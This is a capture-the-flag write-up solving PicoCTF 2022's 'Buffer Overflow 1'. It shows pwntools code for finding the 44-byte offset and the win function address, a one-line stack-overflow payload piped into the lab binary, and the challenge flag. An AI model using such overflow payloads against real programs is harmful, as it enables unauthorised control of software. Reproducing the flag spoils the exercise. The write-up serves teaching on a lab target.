# Buffer Overflow 1

First we need to see if it is vulnerable to buffer overflows:

![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo11.png)

We can modify the address, we need to find a good offset

```
from pwn import *
print(f'Search for: {cyclic(100)}')
```

This returns 

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

When we input it we get

![[Pasted image 20220316194850.png]]

We make that address little endian and find the correct padding like:


```
from pwn import *
print(f'Padding: {cyclic_find(p32(0x6161616c))}')
```

This returns 44, so now that we know the padding we can find the address for the **win** function:

```
from pwn import *
vuln = ELF('./vuln')
print(p32(vuln.symbols['win']))
```

That returns the address "\xf6\x91\x04\x08" so finally we can run the payload like:

```
python2 -c "from pwn import *; print 'A' * 44 + '\xf6\x91\x04\x08'" | ./vuln
```

![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo12.png)

## Flag

> picoCTF{addr3ss3s_ar3_3asy_2e7003a1}